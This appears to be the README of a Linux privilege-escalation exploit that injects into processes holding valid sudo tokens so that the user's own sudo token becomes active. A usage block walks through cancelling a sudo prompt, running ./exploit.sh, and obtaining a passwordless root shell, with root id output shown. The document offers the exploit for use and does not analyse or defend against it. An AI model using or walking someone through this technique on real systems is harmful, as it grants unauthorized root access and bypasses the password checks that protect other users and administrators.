# [Linux] Privilege Escalation by injecting process posseding sudo tokens.

#### Inject process that have valid sudo token and activate our own sudo token.

## How to use
```sh
$ sudo whatever
[sudo] password for user: (Send <ctrl>+c since you don't have the password). // this creates an invalid sudo tokens
$ ./exploit.sh // this activates our sudo token
.... wait 3 seconds
$ sudo -i # no password required :)
# uid=0(root) gid=0(root) groups=0(root)
```
The default password timeout is 15 minutes. So if you use sudo twice in 15 minutes (900 seconds), you will not be asked to type the user’s password again.
